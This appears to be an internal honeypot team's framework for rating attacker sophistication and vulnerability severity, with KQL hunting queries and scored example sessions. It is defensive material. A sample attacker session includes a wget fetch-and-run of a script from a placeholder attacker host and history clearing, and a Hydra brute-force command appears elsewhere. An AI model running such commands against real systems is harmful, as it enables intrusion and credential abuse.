# Attacker & Vulnerability Sophistication Rating Framework

**Purpose:** A consistent scoring system for rating threat actors observed in the NorthStar honeypot environment and the vulnerabilities they exploit. Use this to prioritize investigation, communicate risk, and build threat profiles over time.

---

## Attacker Sophistication Score (1–10)

### LEVEL 1–2: Script Kiddie

**Profile:** No real technical skill. Running downloaded tools against random targets with no specific goal.

| Indicator | Example |
|-----------|---------|
| Default credentials only | admin/admin, root/root, test/test |
| Single command attempts | `whoami` then disconnects |
| No privilege escalation | Never tries `sudo`, never looks for SUID |
| Gives up immediately on failure | 3 attempts then moves on |
| No lateral movement | Never reaches secondary systems |
| Automated spray-and-pray | Same creds against 10,000 IPs/hour |

**KQL to find them:**
```kql
HoneypotEvents_CL
| where EventType == "auth_attempt"
| where strcat(Username, "/", Password) in ("admin/admin","root/root","test/test","guest/guest")
| summarize Count=count(), IPs=make_set(SrcIP) by Username, Password
| order by Count desc
```

**Response:** Low priority. Document and move on. Volume is high but risk is low if defaults are disabled.

---

### LEVEL 3–4: Basic Attacker

**Profile:** Knows how to use common tools. Following tutorials. Has some understanding of what they're doing but limited adaptability.

| Indicator | Example |
|-----------|---------|
| Wordlist-based brute force | Top 1000 passwords from SecLists |
| Basic enumeration | Runs `whoami`, `ls`, `cat /etc/hosts` |
| Attempts privilege escalation | `sudo -l` but doesn't know what to do with results |
| Stays connected for minutes | Actually explores the shell |
| Uses specific tools | Hydra, Metasploit with default settings |
| Leaves obvious IOCs | Runs `./exploit.sh` downloaded from GitHub |

**Typical session:**
```
ssh root/password123   → SUCCESS
whoami                 → appuser
sudo -l                → no sudo rights
ls /home               → lists home dirs
cat /etc/passwd        → reads user list
exits
```

**KQL to find them:**
```kql
HoneypotEvents_CL
| where EventType == "command"
| summarize CommandCount=count(), Commands=make_set(Command,20) by SessionId, SrcIP
| where CommandCount between (2 .. 10)
| order by CommandCount desc
```

**Response:** Medium priority. Note the IP and credential used. Check if password policy needs strengthening.

---

### LEVEL 5–6: Intermediate Attacker

**Profile:** Understands the attack kill chain. Chains techniques together deliberately. Might be following a specific methodology (PTES, offensive security course, CTF background).

| Indicator | Example |
|-----------|---------|
| Custom or leaked credential lists | Using credentials from a known breach |
| Multi-stage attack chains | Recon → exploit → persist in sequence |
| Successful privilege escalation | Actually gets root or finds a path |
| Lateral movement attempts | Tries to SSH to other internal IPs |
| Log clearing | `history -c`, `rm ~/.bash_history` |
| Tool deployment | Downloads tools, makes them executable, runs them |
| Methodical enumeration | Checks processes, network, users, cron jobs |

**Typical session:**
```
ssh admin/HealthStar2024   → SUCCESS (leaked cred)
id && whoami               → knows to check both
cat /etc/hosts             → internal network recon
nmap -sV 10.0.0.5          → discovers Cascade Medical
wget http://attacker.com/linpeas.sh && chmod +x linpeas.sh
./linpeas.sh               → automated privesc enumeration
crontab -e                 → persistence attempt
history -c                 → covers tracks
```

**KQL to find them:**
```kql
HoneypotEvents_CL
| where EventType == "command"
| extend TTP = case(
    Command matches regex @"(?i)(wget|curl).*http", "download",
    Command matches regex @"(?i)chmod \+x", "make_exec",
    Command matches regex @"(?i)(crontab|authorized_keys)", "persist",
    Command matches regex @"(?i)(history -c|rm.*bash_history)", "evade",
    ""
  )
| where TTP != ""
| summarize Stages=dcount(TTP), TTPs=make_set(TTP) by SessionId, SrcIP, Honeypot
| where Stages >= 3
| order by Stages desc
```

**Response:** HIGH priority. This actor got real access and attempted to persist. Document full session. Report to security team.

---

### LEVEL 7–8: Advanced Attacker

**Profile:** Professional skill level. May be organized criminal group, advanced red team, or nation-state affiliated. Has specific targets and objectives.

| Indicator | Example |
|-----------|---------|
| Targeted credentials | Uses credentials specific to the organization |
| Multi-stage payload execution | Staged loader → payload → C2 beacon |
| Kernel or service exploitation | 0-day or N-day CVE exploitation |
| Sophisticated persistence | Kernel module, systemd service, PAM hook |
| Traffic encryption/obfuscation | Tunnels C2 over DNS or HTTPS |
| Anti-forensics | Overwrites logs, uses in-memory execution |
| Precise targeting | Knows what data to look for and where |
| Long dwell time | Stays quiet for days before acting |

**What you WON'T see (they're careful):**
- Default passwords
- Noisy nmap scans
- Plain HTTP downloads
- Obvious tool names (xmrig, exploit.sh)

**KQL to find advanced actors:**
```kql
HoneypotEvents_CL
| summarize
    Sessions   = dcount(SessionId),
    ActiveDays = dcount(bin(TimeGenerated, 1d)),
    Services   = make_set(Service),
    Honeypots  = make_set(Honeypot),
    Commands   = countif(EventType == "command")
  by SrcIP
| where ActiveDays >= 3 and Commands > 10
| extend MultiHoneypot = array_length(Honeypots) > 1
| order by ActiveDays desc
```

**Response:** CRITICAL. Escalate immediately. Full forensic documentation. Consider this a real breach scenario.

---

### LEVEL 9–10: Expert / Nation-State APT

**Profile:** State-sponsored or elite criminal group. Specific mission objectives. Months-long operations. Custom tooling. These actors are unlikely to be caught in honeypot logs — if you see one, it may be intentional reconnaissance or you caught a mistake.

| Indicator | Example |
|-----------|---------|
| Custom malware | Not available on VirusTotal |
| Rootkit deployment | Hides processes, files, network connections |
| Supply chain targeting | Compromises tools used by the target |
| Perfect OPSEC | VPN → Tor → residential proxy → target |
| Zero-day exploitation | Unpatched, undetected vulnerabilities |
| Long-term persistence | Months before detection |
| Data-specific exfiltration | Only steals exactly what they came for |

**Examples in the wild:** Lazarus Group (North Korea), APT41 (China), APT29 / Cozy Bear (Russia), Equation Group (NSA-linked)

**Response:** If you think you're seeing this, you're probably not the right person to handle it alone. Contact CISA, FBI, or your MSSP immediately.

---

## Vulnerability Rating System

### CRITICAL (9–10): Exploited = Attacker Wins Immediately

| Vulnerability | Why It's Critical |
|---------------|------------------|
| Default credentials accepted | Zero effort for attacker, complete access |
| Unauthenticated RCE | Command execution without any login |
| SQL injection on HR/Medical DB | Direct PHI/PII data breach |
| Unauthenticated API with PHI | No barrier to patient data |
| Unpatched RDP (BlueKeep) | Wormable, spreads automatically |

**CVSS:** 9.0–10.0

**Action:** Fix immediately. No exceptions. This is a breach waiting to happen.

---

### HIGH (7–8): Exploited = System Compromise

| Vulnerability | Why It's High |
|---------------|--------------|
| Weak password policy | Brute force succeeds in minutes |
| PHI stored unencrypted | Once DB is accessed, breach is automatic |
| Missing rate limiting on SSH/RDP | Enables unlimited brute force |
| Excessive sudo privileges | Trivial privilege escalation |
| Command injection in inputs | Arbitrary OS command execution |
| World-readable config with creds | Lateral movement enabler |

**CVSS:** 7.0–8.9

**Action:** Fix within 30 days. Priority patch cycle.

---

### MEDIUM (5–6): Exploited = Limited Impact

| Vulnerability | Why It's Medium |
|---------------|----------------|
| Version disclosure in banners | Narrows attacker's exploit selection |
| Missing audit logging | Can't detect/investigate incidents |
| Weak session tokens | Session hijacking possible |
| Open internal ports (Redis, MongoDB) | One pivot away from disaster |
| Missing input validation | Potential injection, needs chaining |

**CVSS:** 5.0–6.9

**Action:** Fix within 90 days. Track in vulnerability management.

---

### LOW (1–4): Exploited = Minimal Direct Risk

| Vulnerability | Why It's Low |
|---------------|-------------|
| OS version in error messages | Information only |
| Directory listing enabled | Attacker sees filenames |
| HTTP instead of HTTPS (internal) | Traffic readable on same network |
| Self-XSS | Only affects the user themselves |
| Banner grabbing reveals service versions | Minor recon assistance |

**CVSS:** 1.0–4.9

**Action:** Fix when convenient. Don't distract from higher priorities.

---

## Exploit Complexity Rating

### TRIVIAL — Script Kiddie Can Do It

- No technical knowledge required
- Single command or single tool
- Public PoC available, runs out-of-the-box
- Time to exploit: **< 1 minute**

**Examples:**
- `ssh admin@target` (default credentials)
- `curl http://target/admin` (no auth required)
- Metasploit module with default settings

---

### SIMPLE — Basic Tools Required

- Requires knowing which tool to use
- Published CVE with working exploit
- Minimal configuration needed
- Time to exploit: **5–30 minutes**

**Examples:**
- Hydra brute force: `hydra -l root -P wordlist.txt ssh://target`
- Published CVE Metasploit module
- SQLmap against a login form

---

### MODERATE — Some Skill Needed

- Requires chaining multiple techniques
- Needs reconnaissance first
- May require credential harvesting step
- Time to exploit: **1–4 hours**

**Examples:**
- Lateral movement: brute force SSH → pivot → second system
- Privilege escalation after initial access
- Redis unauthorized access → write authorized_keys → SSH in

---

### COMPLEX — Expert Only

- 0-day or near-0-day exploitation
- Custom tooling required
- Deep understanding of target system
- Strong OPSEC requirements
- Time to exploit: **Days to weeks**

**Examples:**
- Kernel privilege escalation via race condition
- Custom rootkit for persistence
- Supply chain compromise of CI/CD pipeline

---

## Scoring Examples from Our Honeypots

### Example 1: China IP, Default Creds, Lateral Movement

```
IP: 118.194.250.127
Attack: admin/admin SSH login → whoami → cat /etc/hosts → lateral movement
```

| Dimension | Score | Reasoning |
|-----------|-------|-----------|
| Attacker Sophistication | 4/10 | Used default creds, ran basic commands, attempted pivot |
| Vulnerability Severity | 9/10 | Default credentials = CRITICAL |
| Exploit Complexity | 1/10 | Trivial — single credential attempt |
| **Overall Risk** | **HIGH** | Easy initial access + lateral movement = serious |

**Action:** Disable default credentials immediately. Monitor for follow-up activity from this IP range.

---

### Example 2: Netherlands IP, Hydra + Persistence

```
IP: 185.220.101.47
Attack: Hydra brute force (200 attempts) → shell → nmap → ssh-keygen
```

| Dimension | Score | Reasoning |
|-----------|-------|-----------|
| Attacker Sophistication | 5/10 | Used automated tools, attempted persistence |
| Vulnerability Severity | 7/10 | Weak password policy (HIGH) |
| Exploit Complexity | 2/10 | Hydra is a basic tool |
| **Overall Risk** | **MEDIUM-HIGH** | Persistence attempted, need to check for artifacts |

**Action:** Strengthen password policy. Audit authorized_keys on all systems. Block IP range (Tor exit node).

---

### Example 3: UK IP, Single Auth + SQL Injection Attempt

```
IP: 94.130.26.15
Attack: Single targeted login attempt → shell → SELECT * FROM employees → attempted SQLi
```

| Dimension | Score | Reasoning |
|-----------|-------|-----------|
| Attacker Sophistication | 6/10 | Targeted, knows the system, attempted data exfil |
| Vulnerability Severity | 9/10 | SQL injection = CRITICAL if successful |
| Exploit Complexity | 4/10 | Requires DB knowledge, specific payload crafting |
| **Overall Risk** | **CRITICAL** | Targeted attack on PHI/PII data |

**Action:** Audit database query logs. Implement prepared statements. This actor knew what to look for.

---

### Example 4: Russia IP, Multi-Stage, No Default Creds

```
IP: 91.108.4.200
Attack: Credential stuffing with leaked creds → shell → linpeas → kernel exploit attempt → rootkit
```

| Dimension | Score | Reasoning |
|-----------|-------|-----------|
| Attacker Sophistication | 8/10 | Custom toolchain, CVE exploitation attempt, rootkit |
| Vulnerability Severity | 8/10 | Unpatched kernel (HIGH) |
| Exploit Complexity | 7/10 | Kernel exploit requires real skill |
| **Overall Risk** | **CRITICAL** | Advanced actor with sophisticated tooling |

**Action:** Immediate escalation. Full forensic review. Patch kernel. This is a real threat actor.

---

## Quick Reference Card

```
ATTACKER SCORE    WHAT TO DO
───────────────────────────────────────────
1-2 (Script Kid)  Log it, move on
3-4 (Basic)       Review credentials used, check policy
5-6 (Intermediate) Full session review, report to team
7-8 (Advanced)    Escalate immediately, full forensics
9-10 (APT)        Contact CISA/FBI, external DFIR team

VULN SEVERITY     FIX DEADLINE
───────────────────────────────────────────
CRITICAL (9-10)   Fix TODAY
HIGH (7-8)        Fix within 30 days
MEDIUM (5-6)      Fix within 90 days
LOW (1-4)         Fix when convenient
```
